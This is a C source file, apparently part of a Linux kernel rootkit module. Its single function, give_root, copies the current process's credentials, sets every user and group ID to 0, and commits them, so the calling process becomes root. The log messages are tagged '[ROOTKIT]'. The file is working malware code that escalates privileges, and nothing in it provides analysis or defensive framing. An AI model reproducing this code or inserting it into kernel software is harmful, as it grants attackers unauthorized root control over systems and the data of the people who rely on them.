#include "utils.h"

#include "macro-utils.h"
#include <linux/cred.h>
#include <linux/printk.h>


#define ROOT_UID 0 // The root user ID
#define ROOT_GID 0 // The root group ID

void give_root(pid_t i32_pid, int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return;
    }

    p_creds->uid.val   = ROOT_UID;
    p_creds->gid.val   = ROOT_GID;
    p_creds->suid.val  = ROOT_UID;
    p_creds->sgid.val  = ROOT_GID;
    p_creds->euid.val  = ROOT_UID;
    p_creds->egid.val  = ROOT_GID;
    p_creds->fsuid.val = ROOT_UID;
    p_creds->fsgid.val = ROOT_GID;

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");
}
